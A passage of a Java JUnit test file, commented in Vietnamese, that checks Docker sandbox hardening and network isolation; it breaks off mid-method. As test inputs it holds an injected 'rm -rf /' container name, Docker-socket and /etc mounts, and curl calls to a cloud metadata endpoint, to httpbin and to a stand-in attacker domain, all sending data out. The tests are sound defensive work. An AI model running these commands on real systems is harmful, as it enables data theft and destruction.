package com.greytest.security;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import com.greytest.entity.Project;
import com.greytest.exception.GenerationInProgressException;
import com.greytest.repository.ProjectRepository;
import com.greytest.service.CoverageService;
import com.greytest.service.GenerationJobService;
import com.greytest.service.UnitTestService;
import com.greytest.service.agent.ProjectJavaVersionDetector;
import com.greytest.service.coverage.SandboxTestRunService;
import com.greytest.service.storage.encryption.StorageEncryptionService;
import com.greytest.service.storage.workspace.StorageWorkspaceService;

/**
 * Phase 3.1: Docker Container Hardening & Least Privilege Security Tests.
 * Bao gồm kiểm thử tham số bảo mật và kiểm thử trực tiếp trên Docker daemon thực tế.
 */
class Phase3SandboxSecurityTest {

    private static boolean isSandboxImageAvailable() {
        try {
            Process process = new ProcessBuilder("docker", "image", "inspect", "greytest-sandbox:17").start();
            return process.waitFor(5, TimeUnit.SECONDS) && process.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static String runDockerCmd(List<String> args) throws Exception {
        List<String> cmd = new ArrayList<>(List.of("docker"));
        cmd.addAll(args);
        Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
        }
        process.waitFor(60, TimeUnit.SECONDS);
        return output.toString();
    }

    // =========================================================================
    // 1. DOCKER CLI INPUT VALIDATION & ALLOWLIST TESTS
    // =========================================================================

    @Test
    @DisplayName("9. Docker image ngoài allowlist bị từ chối")
    void testImageAllowlist() {
        assertThat(SandboxTestRunService.ALLOWED_IMAGES).contains(
                "greytest-sandbox:8", "greytest-sandbox:11", "greytest-sandbox:17", "greytest-sandbox:21",
                "maven:3.9-eclipse-temurin-8", "maven:3.9-eclipse-temurin-11",
                "maven:3.9-eclipse-temurin-17", "maven:3.9-eclipse-temurin-21"
        );

        // Hợp lệ
        SandboxTestRunService.validateImage("greytest-sandbox:17");
        SandboxTestRunService.validateImage("maven:3.9-eclipse-temurin-21");

        // Bất hợp lệ
        assertThatThrownBy(() -> SandboxTestRunService.validateImage("alpine:latest"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("allowlist");

        assertThatThrownBy(() -> SandboxTestRunService.validateImage("malicious/image:tag"))
                .isInstanceOf(IllegalArgumentException.class);

        assertThatThrownBy(() -> SandboxTestRunService.validateImage(null))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("10. Path traversal và mount path không hợp lệ bị từ chối")
    void testMountAndArgsValidation() {
        // Mount nguy hiểm
        assertThatThrownBy(() -> SandboxTestRunService.validateMount("/var/run/docker.sock:/var/run/docker.sock"))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("Cấm mount các thư mục hệ thống");

        assertThatThrownBy(() -> SandboxTestRunService.validateMount("/etc:/etc"))
                .isInstanceOf(SecurityException.class);

        assertThatThrownBy(() -> SandboxTestRunService.validateMount("/home/user:/home/user"))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("Cấm bind-mount trực tiếp đường dẫn host");

        assertThatThrownBy(() -> SandboxTestRunService.validateMount("/app/storage:/app/storage"))
                .isInstanceOf(SecurityException.class);

        assertThatThrownBy(() -> SandboxTestRunService.validateMount("C:\\Windows:/host"))
                .isInstanceOf(SecurityException.class);

        // Cờ privileged và mount dạng gán bằng
        assertThatThrownBy(() -> SandboxTestRunService.validateDockerArgs(List.of("run", "--privileged", "greytest-sandbox:17")))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("--privileged");

        assertThatThrownBy(() -> SandboxTestRunService.validateDockerArgs(List.of("run", "--privileged=true", "greytest-sandbox:17")))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("--privileged");

        assertThatThrownBy(() -> SandboxTestRunService.validateDockerArgs(List.of("run", "--mount=type=bind,source=/etc,target=/etc", "greytest-sandbox:17")))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("--mount");

        assertThatThrownBy(() -> SandboxTestRunService.validateDockerArgs(List.of("create", "--volume=/etc:/etc", "greytest-sandbox:17")))
                .isInstanceOf(SecurityException.class);

        // Cấm host network
        assertThatThrownBy(() -> SandboxTestRunService.validateDockerArgs(List.of("create", "--net=host", "greytest-sandbox:17")))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("host network");

        assertThatThrownBy(() -> SandboxTestRunService.validateDockerArgs(List.of("create", "--network", "host", "greytest-sandbox:17")))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("host network");

        // Ký tự xuống dòng
        assertThatThrownBy(() -> SandboxTestRunService.validateDockerArgs(List.of("create", "image\n--privileged")))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("xuống dòng");

        // Container name traversal/injection
        assertThatThrownBy(() -> SandboxTestRunService.validateContainerName("greytest-run-123; rm -rf /"))
                .isInstanceOf(IllegalArgumentException.class);

        // Container name hợp lệ
        SandboxTestRunService.validateContainerName("greytest-run-" + UUID.randomUUID());
    }

    @Test
    @DisplayName("Phase 3.2: Network policy validation chỉ cho phép none và greytest_sandbox_net")
    void testNetworkPolicyValidation() {
        SandboxTestRunService.validateNetwork("none");
        SandboxTestRunService.validateNetwork("greytest_sandbox_net");

        assertThatThrownBy(() -> SandboxTestRunService.validateNetwork("host"))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("Network không nằm trong allowlist");

        assertThatThrownBy(() -> SandboxTestRunService.validateNetwork("bridge"))
                .isInstanceOf(SecurityException.class);

        assertThatThrownBy(() -> SandboxTestRunService.validateNetwork("kltn_26_27_greytest_be_default"))
                .isInstanceOf(SecurityException.class);
    }

    @Test
    @DisplayName("8. Maven cache được cô lập theo Project ID để chống cache poisoning")
    void testMavenCacheProjectIsolation() {
        Long projectA = 101L;
        Long projectB = 202L;
        String volumeA = "greytest_sandbox_m2_p" + projectA;
        String volumeB = "greytest_sandbox_m2_p" + projectB;

        assertThat(volumeA).isNotEqualTo(volumeB);
        assertThat(volumeA).isEqualTo("greytest_sandbox_m2_p101");
        assertThat(volumeB).isEqualTo("greytest_sandbox_m2_p202");
    }

    // =========================================================================
    // 2. LIVE DOCKER CONTAINER HARDENING TESTS (Chạy trên Docker thực tế)
    // =========================================================================

    @Test
    @DisplayName("1. Sandbox thực sự chạy non-root (UID 1000, GID 1000, user greytest)")
    void testLiveNonRootExecution() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String idOutput = runDockerCmd(List.of("exec", container, "id"));
            assertThat(idOutput).contains("uid=1000(greytest)");
            assertThat(idOutput).contains("gid=1000(greytest)");
            assertThat(idOutput).doesNotContain("groups=0(root)");
            assertThat(idOutput).doesNotContain("27(sudo)");

            String whoami = runDockerCmd(List.of("exec", container, "whoami")).trim();
            assertThat(whoami).isEqualTo("greytest");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("2. Toàn bộ Linux capabilities bị tước bỏ (--cap-drop ALL)")
    void testLiveCapabilitiesDropped() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String capStatus = runDockerCmd(List.of("exec", container, "grep", "-E", "^Cap(Inh|Prm|Eff|Bnd|Amb):", "/proc/self/status"));
            assertThat(capStatus).contains("CapInh:\t0000000000000000");
            assertThat(capStatus).contains("CapPrm:\t0000000000000000");
            assertThat(capStatus).contains("CapEff:\t0000000000000000");
            assertThat(capStatus).contains("CapBnd:\t0000000000000000");
            assertThat(capStatus).contains("CapAmb:\t0000000000000000");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("3. no-new-privileges được bật ngăn leo thang quyền")
    void testLiveNoNewPrivileges() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String privStatus = runDockerCmd(List.of("exec", container, "grep", "NoNewPrivs:", "/proc/self/status"));
            assertThat(privStatus).contains("NoNewPrivs:\t1");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("4. Root filesystem không thể ghi (--read-only)")
    void testLiveReadOnlyRootFilesystem() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            // Thử ghi vào root: /test.txt, /etc/test, /root/test
            String writeRoot = runDockerCmd(List.of("exec", container, "sh", "-c", "touch /root_test.txt 2>&1 || echo 'WRITE_BLOCKED'"));
            assertThat(writeRoot).containsAnyOf("Read-only file system", "Permission denied", "WRITE_BLOCKED");

            String writeEtc = runDockerCmd(List.of("exec", container, "sh", "-c", "touch /etc/malicious 2>&1 || echo 'WRITE_BLOCKED'"));
            assertThat(writeEtc).containsAnyOf("Read-only file system", "Permission denied", "WRITE_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("5. Thư mục /work vẫn ghi được cho user 1000")
    void testLiveWorkDirWritable(@TempDir Path tempDir) throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));

            // Copy file từ host vào container /work
            Path dummy = tempDir.resolve("sample.txt");
            Files.writeString(dummy, "sample content");
            runDockerCmd(List.of("cp", dummy.toString(), container + ":/work/sample.txt"));

            runDockerCmd(List.of("start", container));

            // User 1000 ghi file mới vào /work
            String writeWork = runDockerCmd(List.of("exec", container, "sh", "-c", "echo 'ok' > /work/output.txt && cat /work/output.txt")).trim();
            assertThat(writeWork).isEqualTo("ok");

            // User 1000 xóa file trong /work
            String deleteFile = runDockerCmd(List.of("exec", container, "sh", "-c", "rm -f /work/sample.txt && echo 'DELETED'")).trim();
            assertThat(deleteFile).isEqualTo("DELETED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("6. /tmp hoạt động trên tmpfs có giới hạn dung lượng")
    void testLiveTmpfsLimited() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            // Kiểm tra mount type của /tmp
            String mountOutput = runDockerCmd(List.of("exec", container, "sh", "-c", "mount | grep ' /tmp '"));
            assertThat(mountOutput).contains("tmpfs on /tmp type tmpfs");

            // Ghi file vào /tmp
            String writeTmp = runDockerCmd(List.of("exec", container, "sh", "-c", "echo 'temp' > /tmp/temp.txt && cat /tmp/temp.txt")).trim();
            assertThat(writeTmp).isEqualTo("temp");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("11. Sandbox tuyệt đối không có Docker socket")
    void testLiveNoDockerSocket() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String socketCheck = runDockerCmd(List.of("exec", container, "sh", "-c", "ls -la /var/run/docker.sock 2>&1 || echo 'NO_SOCKET'")).trim();
            assertThat(socketCheck).containsAnyOf("No such file or directory", "NO_SOCKET");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("7. Maven build và JUnit vẫn chạy bình thường trong môi trường hardened")
    void testLiveMavenExecution() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--memory", "2g",
                    "--cpus", "2",
                    "--pids-limit", "512",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--user", "1000:1000",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String mvnVer = runDockerCmd(List.of("exec", container, "mvn", "-version"));
            assertThat(mvnVer).contains("Apache Maven");
            assertThat(mvnVer).contains("Java version: 17");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    // =========================================================================
    // 3. PHASE 3.2: LIVE NETWORK ISOLATION & ANTI-EXFILTRATION TESTS
    // =========================================================================

    @Test
    @DisplayName("Phase 3.2 - 1: Sandbox không kết nối được PostgreSQL nội bộ")
    void testLiveNetworkIsolationPostgres() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String pgCheck = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -m 2 http://postgres:5432 2>&1 || echo 'POSTGRES_BLOCKED'"));
            assertThat(pgCheck).containsAnyOf("Could not resolve host", "Couldn't connect to server", "Network is unreachable", "POSTGRES_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - 2: Sandbox không gọi được Backend API nội bộ")
    void testLiveNetworkIsolationBackend() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String backendCheck = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -m 2 http://backend:8080/api/projects 2>&1 || echo 'BACKEND_BLOCKED'"));
            assertThat(backendCheck).containsAnyOf("Could not resolve host", "Couldn't connect to server", "Network is unreachable", "BACKEND_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - 4: Sandbox không truy cập được Cloud Metadata endpoint (169.254.169.254)")
    void testLiveNetworkIsolationCloudMetadata() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String metaCheck = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -m 2 http://169.254.169.254/latest/meta-data/ 2>&1 || echo 'METADATA_BLOCKED'"));
            assertThat(metaCheck).containsAnyOf("Couldn't connect to server", "Network is unreachable", "METADATA_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - 5: Sandbox không truy cập được Intranet và mạng nội bộ (RFC1918)")
    void testLiveNetworkIsolationIntranet() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String subnetCheck10 = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -m 2 http://10.0.0.1 2>&1 || echo 'INTRANET_BLOCKED'"));
            assertThat(subnetCheck10).containsAnyOf("Couldn't connect to server", "Network is unreachable", "INTRANET_BLOCKED");

            String subnetCheck192 = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -m 2 http://192.168.1.1 2>&1 || echo 'INTRANET_BLOCKED'"));
            assertThat(subnetCheck192).containsAnyOf("Couldn't connect to server", "Network is unreachable", "INTRANET_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - 6: Sandbox không thể gửi source code ra ngoài Internet (Anti-Exfiltration)")
    void testLiveAntiExfiltrationExternal() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String exfilCheck = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -m 2 -X POST -d 'source_code_exfil_data' https://httpbin.org/post 2>&1 || echo 'EXFIL_BLOCKED'"));
            assertThat(exfilCheck).containsAnyOf("Could not resolve host", "Couldn't connect to server", "Network is unreachable", "EXFIL_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - 7: DNS không thể được sử dụng để vượt qua network policy (DNS tunneling blocked)")
    void testLiveDnsTunnelingBlocked() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String dnsCheck = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -m 2 http://secret-exfil-data.attacker-domain.com 2>&1 || echo 'DNS_BLOCKED'"));
            assertThat(dnsCheck).containsAnyOf("Could not resolve host", "DNS_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - IPv6: Kết nối IPv6 bị chặn an toàn trong Air-Gap")
    void testLiveIPv6Isolation() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String ipv6Check = runDockerCmd(List.of("exec", container, "sh", "-c",
                    "curl -6 -m 2 http://[2001:db8::1]:80 2>&1 || echo 'IPV6_BLOCKED'"));
            assertThat(ipv6Check).containsAnyOf("Couldn't connect to server", "Network is unreachable", "IPV6_BLOCKED");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - 8: Dynamic network disconnect xóa hoàn toàn eth0 và kích hoạt Air-Gap")
    void testLiveDynamicNetworkDisconnectAirGap() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        // Đảm bảo network bridge riêng tồn tại
        runDockerCmd(List.of("network", "create", "--driver", "bridge", "greytest_sandbox_net"));

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "greytest_sandbox_net",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            // Khi còn kết nối, container có eth0
            String netDevBefore = runDockerCmd(List.of("exec", container, "cat", "/proc/net/dev"));
            assertThat(netDevBefore).contains("eth0");

            // Ngắt kết nối mạng trước khi chạy test
            runDockerCmd(List.of("network", "disconnect", "greytest_sandbox_net", container));

            // Sau khi ngắt kết nối, eth0 biến mất, chỉ còn lo (100% Air-Gap)
            String netDevAfter = runDockerCmd(List.of("exec", container, "cat", "/proc/net/dev"));
            assertThat(netDevAfter).doesNotContain("eth0");
            assertThat(netDevAfter).contains("lo");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.2 - 9: Maven offline test thực thi hoàn hảo trong môi trường Air-Gap")
    void testLiveOfflineMavenExecutionInAirGap() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-sec-test-" + UUID.randomUUID();
        try {
            runDockerCmd(List.of("create", "--name", container,
                    "--network", "none",
                    "--user", "1000:1000",
                    "--cap-drop", "ALL",
                    "--security-opt", "no-new-privileges:true",
                    "--read-only",
                    "--tmpfs", "/tmp:exec,mode=1777,size=256m",
                    "-v", "/work",
                    "greytest-sandbox:17", "sh", "-c", "while :; do sleep 3600; done"));
            runDockerCmd(List.of("start", container));

            String mvnOutput = runDockerCmd(List.of("exec", container, "mvn", "-version"));
            assertThat(mvnOutput).contains("Apache Maven");
            assertThat(mvnOutput).contains("Java version: 17");
        } finally {
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    // ==========================================
    // PHASE 3.3: PLAINTEXT LIFECYCLE & CLEANUP
    // ==========================================

    @Test
    @DisplayName("Phase 3.3 - 1: Hai Project không truy cập được workspace của nhau")
    void testProjectWorkspaceIsolation(@TempDir Path tempDir) throws Exception {
        StorageEncryptionService enc = mock(StorageEncryptionService.class);
        ProjectRepository repo = mock(ProjectRepository.class);
        SecretKey key = new SecretKeySpec(new byte[32], "AES");
        when(enc.unwrapDek(any())).thenReturn(key);

        Path storage1 = tempDir.resolve("storage1");
        Path storage2 = tempDir.resolve("storage2");
        Files.createDirectories(storage1);
        Files.createDirectories(storage2);
        Files.writeString(storage1.resolve("Secret1.java"), "class Secret1 {}");
        Files.writeString(storage2.resolve("Secret2.java"), "class Secret2 {}");

        Project p1 = new Project();
        p1.setId(101L);
        p1.setStoragePath(storage1.toString());
        p1.setStorageEncrypted(true);
        p1.setEncryptedDek("dummy-dek-1");

        Project p2 = new Project();
        p2.setId(202L);
        p2.setStoragePath(storage2.toString());
        p2.setStorageEncrypted(true);
        p2.setEncryptedDek("dummy-dek-2");

        StorageWorkspaceService service = new StorageWorkspaceService(tempDir.toString(), enc, repo);

        try (var ws1 = service.acquireWorkspace(p1);
             var ws2 = service.acquireWorkspace(p2)) {
            assertThat(ws1.getPath()).isNotEqualTo(ws2.getPath());
            assertThat(ws1.getPath().getFileName().toString()).startsWith("ws-101-");
            assertThat(ws2.getPath().getFileName().toString()).startsWith("ws-202-");
        }
    }

    @Test
    @DisplayName("Phase 3.3 - 2: Hai Job cùng Project từ chối chạy đồng thời")
    void testConcurrentJobSameProjectRejected() {
        UnitTestService units = mock(UnitTestService.class);
        ProjectRepository projects = mock(ProjectRepository.class);
        CoverageService coverage = mock(CoverageService.class);
        GenerationJobService jobs = mock(GenerationJobService.class);
        ProjectJavaVersionDetector javaVersions = mock(ProjectJavaVersionDetector.class);

        Project project = new Project();
        project.setId(101L);
        project.setStoragePath("dummy");
        when(projects.findById(101L)).thenReturn(Optional.of(project));

        SandboxTestRunService service = new SandboxTestRunService(
                units, projects, coverage, jobs, javaVersions,
                runnable -> {},
                (args, log) -> new SandboxTestRunService.Result(0));

        service.start(101L, null);
        assertThatThrownBy(() -> service.start(101L, null))
                .isInstanceOf(GenerationInProgressException.class)
                .hasMessageContaining("Project này đang chạy test trong sandbox");
    }

    @Test
    @DisplayName("Phase 3.3 - 3: Job hoàn thành thì workspace tạm được cleanup")
    void testCompletedJobWorkspacesCleaned(@TempDir Path tempDir) throws Exception {
        Path work = SandboxTestRunService.createSecureTempDirectory("greytest-run-p101-");
        Files.writeString(work.resolve("output.txt"), "some output");
        assertThat(Files.exists(work)).isTrue();

        SandboxTestRunService.deleteTree(work);
        assertThat(Files.exists(work)).isFalse();
    }

    @Test
    @DisplayName("Phase 3.3 - 4: Job timeout được phát hiện và dọn dẹp")
    void testTimeoutJobWorkspacesCleaned(@TempDir Path tempDir) throws Exception {
        UnitTestService units = mock(UnitTestService.class);
        ProjectRepository projects = mock(ProjectRepository.class);
        CoverageService coverage = mock(CoverageService.class);
        GenerationJobService jobs = mock(GenerationJobService.class);
        ProjectJavaVersionDetector javaVersions = mock(ProjectJavaVersionDetector.class);

